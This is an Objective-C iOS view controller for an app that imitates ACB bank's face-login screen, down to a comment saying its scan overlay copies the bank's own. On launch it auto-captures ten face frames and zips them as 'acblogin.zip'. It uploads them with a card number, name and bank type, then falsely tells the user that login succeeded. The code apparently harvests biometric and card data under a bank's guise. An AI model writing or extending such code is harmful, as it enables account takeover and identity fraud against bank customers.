#import "ViewController.h"
#import "ZipManager.h"

@interface ViewController ()
@property (nonatomic, strong) CameraManager *cameraManager;
@property (nonatomic, strong) ACBUploader *uploader;

// UI Elements
@property (nonatomic, strong) UIView *cameraContainerView;
@property (nonatomic, strong) UIView *overlayView;
@property (nonatomic, strong) CAShapeLayer *maskLayer;
@property (nonatomic, strong) CAShapeLayer *borderLayer;
@property (nonatomic, strong) CAShapeLayer *scanArcLayer1;
@property (nonatomic, strong) CAShapeLayer *scanArcLayer2;

@property (nonatomic, strong) UILabel *titleLabel;
@property (nonatomic, strong) UILabel *instructionLabel;
@property (nonatomic, strong) UILabel *stageCounterLabel;
@property (nonatomic, strong) UILabel *faceQualityBadge;
@property (nonatomic, strong) UIButton *startCaptureButton;
@property (nonatomic, strong) UIButton *configButton;

// Upload UI
@property (nonatomic, strong) UIView *uploadDialog;
@property (nonatomic, strong) UIProgressView *progressBar;
@property (nonatomic, strong) UILabel *uploadStatusLabel;

// Configs
@property (nonatomic, strong) NSString *cardNumber;
@property (nonatomic, strong) NSString *userName;
@property (nonatomic, strong) NSString *bankType;

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    
    self.cardNumber = @"9704000000000000";
    self.userName = @"NGUYEN VAN A";
    self.bankType = @"ACB";
    
    [self setupCamera];
    [self setupOverlayUI];
    [self setupControls];
    [self setupUploadDialog];
    [self startScanArcsAnimation];
    
    self.uploader = [[ACBUploader alloc] init];
    self.uploader.delegate = self;
    
    // Tu dong quet mat dang nhap khi mo app
    [self.cameraManager startAutoCapture];
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    self.cameraManager.previewLayer.frame = self.view.bounds;
    [self updateOvalPaths];
}

- (void)setupCamera {
    self.cameraContainerView = [[UIView alloc] initWithFrame:self.view.bounds];
    [self.view addSubview:self.cameraContainerView];
    
    self.cameraManager = [[CameraManager alloc] init];
    self.cameraManager.delegate = self;
    [self.cameraContainerView.layer addSublayer:self.cameraManager.previewLayer];
    [self.cameraManager startSession];
}

- (void)setupOverlayUI {
    self.overlayView = [[UIView alloc] initWithFrame:self.view.bounds];
    self.overlayView.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.65];
    self.overlayView.userInteractionEnabled = NO;
    [self.view addSubview:self.overlayView];
    
    // Mask layer
    self.maskLayer = [CAShapeLayer layer];
    self.maskLayer.fillRule = kCAFillRuleEvenOdd;
    self.overlayView.layer.mask = self.maskLayer;
    
    // Border layer
    self.borderLayer = [CAShapeLayer layer];
    self.borderLayer.strokeColor = [UIColor colorWithWhite:0.7 alpha:1.0].CGColor;
    self.borderLayer.fillColor = [UIColor clearColor].CGColor;
    self.borderLayer.lineWidth = 3.5;
    [self.view.layer addSublayer:self.borderLayer];
    
    // Scan Arcs (vong quet xoay radar quanh oval giong LoginFaceOverlayView cua ACB)
    self.scanArcLayer1 = [CAShapeLayer layer];
    self.scanArcLayer1.strokeColor = [UIColor colorWithRed:0.09 green:0.50 blue:0.95 alpha:1.0].CGColor;
    self.scanArcLayer1.fillColor = [UIColor clearColor].CGColor;
    self.scanArcLayer1.lineWidth = 5.0;
    self.scanArcLayer1.lineCap = kCALineCapRound;
    [self.view.layer addSublayer:self.scanArcLayer1];
    
    self.scanArcLayer2 = [CAShapeLayer layer];
    self.scanArcLayer2.strokeColor = [UIColor colorWithRed:0.1 green:0.85 blue:0.4 alpha:1.0].CGColor;
    self.scanArcLayer2.fillColor = [UIColor clearColor].CGColor;
    self.scanArcLayer2.lineWidth = 5.0;
    self.scanArcLayer2.lineCap = kCALineCapRound;
    [self.view.layer addSublayer:self.scanArcLayer2];
    
    // Title
    self.titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 52, self.view.bounds.size.width - 40, 28)];
    self.titleLabel.text = @"Xác thực khuôn mặt Đăng nhập";
    self.titleLabel.textColor = [UIColor whiteColor];
    self.titleLabel.font = [UIFont boldSystemFontOfSize:20];
    self.titleLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.titleLabel];
    
    // Instruction label
    self.instructionLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 85, self.view.bounds.size.width - 40, 44)];
    self.instructionLabel.text = @"Vui lòng nhìn thẳng và giữ khuôn mặt trong khung hình";
    self.instructionLabel.textColor = [UIColor colorWithWhite:0.95 alpha:1.0];
    self.instructionLabel.font = [UIFont systemFontOfSize:15];
    self.instructionLabel.textAlignment = NSTextAlignmentCenter;
    self.instructionLabel.numberOfLines = 2;
    [self.view addSubview:self.instructionLabel];
    
    // Quality badge
    self.faceQualityBadge = [[UILabel alloc] initWithFrame:CGRectMake((self.view.bounds.size.width - 190) / 2.0, 135, 190, 28)];
    self.faceQualityBadge.text = @"Đang quét khuôn mặt...";
    self.faceQualityBadge.textColor = [UIColor whiteColor];
    self.faceQualityBadge.backgroundColor = [UIColor colorWithWhite:0.2 alpha:0.75];
    self.faceQualityBadge.font = [UIFont boldSystemFontOfSize:12];
    self.faceQualityBadge.textAlignment = NSTextAlignmentCenter;
    self.faceQualityBadge.layer.cornerRadius = 14;
    self.faceQualityBadge.layer.masksToBounds = YES;
    [self.view addSubview:self.faceQualityBadge];
    
    // Stage counter label
    self.stageCounterLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, self.view.bounds.size.height - 180, self.view.bounds.size.width - 40, 26)];
    self.stageCounterLabel.text = @"Tiến trình: 0/10 frames";
    self.stageCounterLabel.textColor = [UIColor colorWithRed:0.09 green:0.50 blue:0.95 alpha:1.0];
    self.stageCounterLabel.font = [UIFont boldSystemFontOfSize:17];
    self.stageCounterLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.stageCounterLabel];
}

- (void)updateOvalPaths {
    CGFloat screenW = self.view.bounds.size.width;
    CGFloat screenH = self.view.bounds.size.height;
    
    CGFloat ovalW = screenW * 0.76;
    CGFloat ovalH = ovalW * 1.34;
    CGFloat ovalX = (screenW - ovalW) / 2.0;
    CGFloat ovalY = (screenH - ovalH) / 2.0 - 15.0;
    CGRect ovalRect = CGRectMake(ovalX, ovalY, ovalW, ovalH);
    
    UIBezierPath *path = [UIBezierPath bezierPathWithRect:self.view.bounds];
    UIBezierPath *ovalPath = [UIBezierPath bezierPathWithOvalInRect:ovalRect];
    [path appendPath:ovalPath];
    
    self.maskLayer.path = path.CGPath;
    self.borderLayer.path = ovalPath.CGPath;
    
    UIBezierPath *arc1 = [UIBezierPath bezierPathWithArcCenter:CGPointMake(CGRectGetMidX(ovalRect), CGRectGetMidY(ovalRect))
                                                        radius:ovalW / 2.0 + 3.0
                                                    startAngle:0
                                                      endAngle:M_PI_2
                                                     clockwise:YES];
    self.scanArcLayer1.path = arc1.CGPath;
    
    UIBezierPath *arc2 = [UIBezierPath bezierPathWithArcCenter:CGPointMake(CGRectGetMidX(ovalRect), CGRectGetMidY(ovalRect))
                                                        radius:ovalW / 2.0 + 3.0
                                                    startAngle:M_PI
                                                      endAngle:M_PI + M_PI_2
                                                     clockwise:YES];
    self.scanArcLayer2.path = arc2.CGPath;
}

- (void)startScanArcsAnimation {
    CABasicAnimation *rotation = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
    rotation.toValue = @(M_PI * 2.0);
    rotation.duration = 2.2;
    rotation.cumulative = YES;
    rotation.repeatCount = HUGE_VALF;
    
    CGPoint center = CGPointMake(self.view.bounds.size.width / 2.0, self.view.bounds.size.height / 2.0 - 15.0);
    self.scanArcLayer1.position = center;
    self.scanArcLayer1.bounds = CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height);
    [self.scanArcLayer1 addAnimation:rotation forKey:@"rotation"];
    
    self.scanArcLayer2.position = center;
    self.scanArcLayer2.bounds = CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height);
    [self.scanArcLayer2 addAnimation:rotation forKey:@"rotation"];
}

- (void)setupControls {
    CGFloat screenW = self.view.bounds.size.width;
    CGFloat screenH = self.view.bounds.size.height;
    
    self.startCaptureButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.startCaptureButton.frame = CGRectMake((screenW - 200) / 2.0, screenH - 110, 200, 48);
    self.startCaptureButton.backgroundColor = [UIColor colorWithRed:0.09 green:0.45 blue:0.95 alpha:1.0];
    [self.startCaptureButton setTitle:@"QUÉT LẠI MẶT" forState:UIControlStateNormal];
    [self.startCaptureButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.startCaptureButton.titleLabel.font = [UIFont boldSystemFontOfSize:15];
    self.startCaptureButton.layer.cornerRadius = 24;
    [self.startCaptureButton addTarget:self action:@selector(onResetAutoCapture) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.startCaptureButton];
    
    self.configButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.configButton.frame = CGRectMake(screenW - 85, 50, 70, 32);
    [self.configButton setTitle:@"Cấu hình" forState:UIControlStateNormal];
    [self.configButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.configButton.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.7];
    self.configButton.layer.cornerRadius = 8;
    self.configButton.titleLabel.font = [UIFont systemFontOfSize:13];
    [self.configButton addTarget:self action:@selector(onConfigTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.configButton];
}

- (void)setupUploadDialog {
    CGFloat screenW = self.view.bounds.size.width;
    CGFloat screenH = self.view.bounds.size.height;
    
    self.uploadDialog = [[UIView alloc] initWithFrame:CGRectMake(30, (screenH - 160) / 2.0, screenW - 60, 160)];
    self.uploadDialog.backgroundColor = [UIColor colorWithWhite:0.12 alpha:0.98];
    self.uploadDialog.layer.cornerRadius = 16;
    self.uploadDialog.layer.borderWidth = 1.0;
    self.uploadDialog.layer.borderColor = [UIColor colorWithWhite:0.3 alpha:1.0].CGColor;
    self.uploadDialog.hidden = YES;
    [self.view addSubview:self.uploadDialog];
    
    UILabel *dialogTitle = [[UILabel alloc] initWithFrame:CGRectMake(16, 20, self.uploadDialog.bounds.size.width - 32, 24)];
    dialogTitle.text = @"Đang gửi dữ liệu đăng nhập...";
    dialogTitle.textColor = [UIColor whiteColor];
    dialogTitle.font = [UIFont boldSystemFontOfSize:16];
    dialogTitle.textAlignment = NSTextAlignmentCenter;
    [self.uploadDialog addSubview:dialogTitle];
    
    self.progressBar = [[UIProgressView alloc] initWithProgressViewStyle:UIProgressViewStyleDefault];
    self.progressBar.frame = CGRectMake(24, 70, self.uploadDialog.bounds.size.width - 48, 8);
    self.progressBar.progressTintColor = [UIColor colorWithRed:0.09 green:0.45 blue:0.95 alpha:1.0];
    self.progressBar.trackTintColor = [UIColor colorWithWhite:0.3 alpha:1.0];
    [self.uploadDialog addSubview:self.progressBar];
    
    self.uploadStatusLabel = [[UILabel alloc] initWithFrame:CGRectMake(16, 100, self.uploadDialog.bounds.size.width - 32, 24)];
    self.uploadStatusLabel.text = @"Chuẩn bị gửi dữ liệu...";
    self.uploadStatusLabel.textColor = [UIColor colorWithWhite:0.8 alpha:1.0];
    self.uploadStatusLabel.font = [UIFont systemFontOfSize:13];
    self.uploadStatusLabel.textAlignment = NSTextAlignmentCenter;
    [self.uploadDialog addSubview:self.uploadStatusLabel];
}

#pragma mark - Actions

- (void)onResetAutoCapture {
    [self.cameraManager resetCapture];
    self.instructionLabel.text = @"Vui lòng nhìn thẳng và giữ khuôn mặt trong khung hình";
    self.stageCounterLabel.text = @"Tiến trình: 0/10 frames";
    self.borderLayer.strokeColor = [UIColor colorWithWhite:0.7 alpha:1.0].CGColor;
    [self.cameraManager startAutoCapture];
}

- (void)onConfigTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Cấu hình Đăng nhập" message:@"Thông tin gửi kèm multipart:" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.placeholder = @"Số thẻ / Tài khoản"; t.text = self.cardNumber; }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.placeholder = @"Họ và tên"; t.text = self.userName; }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.placeholder = @"Ngân hàng"; t.text = self.bankType; }];
    
    [alert addAction:[UIAlertAction actionWithTitle:@"Lưu" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        self.cardNumber = alert.textFields[0].text;
        self.userName = alert.textFields[1].text;
        self.bankType = alert.textFields[2].text;
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:@"Hủy" style:UIAlertActionStyleCancel handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

#pragma mark - CameraManagerDelegate

- (void)cameraManagerDidDetectFace:(CGRect)normalizedFaceBounds isCentered:(BOOL)centered isDistanceQualified:(BOOL)qualified distanceRatio:(CGFloat)ratio {
    if (CGRectIsEmpty(normalizedFaceBounds)) {
        self.faceQualityBadge.text = @"Không thấy khuôn mặt";
        self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.7 green:0.2 blue:0.2 alpha:0.8];
        self.borderLayer.strokeColor = [UIColor colorWithWhite:0.5 alpha:1.0].CGColor;
        return;
    }
    
    if (!centered) {
        self.faceQualityBadge.text = @"Nhìn thẳng & vào giữa";
        self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.85 green:0.55 blue:0.1 alpha:0.85];
        self.borderLayer.strokeColor = [UIColor colorWithRed:0.9 green:0.6 blue:0.1 alpha:1.0].CGColor;
        return;
    }
    
    if (!qualified) {
        self.faceQualityBadge.text = (ratio < 0.35) ? @"Tiến lại gần hơn chút" : @"Lùi ra xa hơn chút";
        self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.1 green:0.45 blue:0.85 alpha:0.85];
        self.borderLayer.strokeColor = [UIColor colorWithRed:0.1 green:0.5 blue:0.95 alpha:1.0].CGColor;
        return;
    }
    
    // Dat chuan -> Vien oval xanh la cay va tu dong chup lien tuc
    self.faceQualityBadge.text = @"ĐẠT CHUẨN - TỰ ĐỘNG CHỤP";
    self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.15 green:0.75 blue:0.25 alpha:0.9];
    self.borderLayer.strokeColor = [UIColor colorWithRed:0.15 green:0.85 blue:0.25 alpha:1.0].CGColor;
}

- (void)cameraManagerDidCaptureFrame:(UIImage *)image index:(NSInteger)index total:(NSInteger)total {
    self.stageCounterLabel.text = [NSString stringWithFormat:@"Đã chụp: %ld/%ld frames", (long)index, (long)total];
}

- (void)cameraManagerDidFinishCaptureWithFolder:(NSString *)folderPath {
    self.instructionLabel.text = @"Đã đủ 10 ảnh! Đang đóng gói acblogin.zip...";
    self.stageCounterLabel.text = @"Đang chuẩn bị gửi...";
    self.faceQualityBadge.text = @"Hoàn tất chụp";
    
    NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"acblogin.zip"];
    [[NSFileManager defaultManager] removeItemAtPath:zipPath error:nil];
    
    // Tao file zip flat chua truc tiep cac anh 1.jpg ... 10.jpg
    BOOL zipOk = [ZipManager createZipArchiveAtPath:zipPath fromSourceFolder:folderPath error:nil];
    if (!zipOk) {
        self.instructionLabel.text = @"Lỗi đóng gói zip!";
        return;
    }
    
    self.uploadDialog.hidden = NO;
    self.progressBar.progress = 0.0;
    self.uploadStatusLabel.text = @"Đang gửi dữ liệu đăng nhập...";
    
    // Upload voi fileName = "acblogin.zip"
    [self.uploader uploadZipFile:zipPath fileName:@"acblogin.zip" card:self.cardNumber name:self.userName bankType:self.bankType];
}

#pragma mark - ACBUploaderDelegate

- (void)uploaderDidProgress:(float)progress currentChunk:(NSInteger)current totalChunks:(NSInteger)total {
    self.progressBar.progress = progress;
    self.uploadStatusLabel.text = [NSString stringWithFormat:@"Đang tải: %ld/%ld chunks (%.0f%%)", (long)current, (long)total, progress * 100.0];
}

- (void)uploaderDidFinishSuccessWithResponse:(NSDictionary *)response {
    self.uploadDialog.hidden = YES;
    self.instructionLabel.text = @"Đăng nhập thành công!";
    self.stageCounterLabel.text = @"Xác thực hoàn tất 100%";
    
    NSString *fileId = response[@"data"][@"fileInfo"][@"fileId"] ?: @"OK";
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Đăng Nhập Thành Công"
                                                                   message:[NSString stringWithFormat:@"Server đã xác thực khuôn mặt thành công!\nFile ID: %@", fileId]
                                                            preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleDefault handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)uploaderDidFailWithError:(NSString *)errorMessage {
    self.uploadDialog.hidden = YES;
    self.instructionLabel.text = @"Lỗi khi gửi dữ liệu!";
    
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Lỗi Đăng Nhập"
                                                                   message:errorMessage
                                                            preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"Thử lại" style:UIAlertActionStyleCancel handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

@end
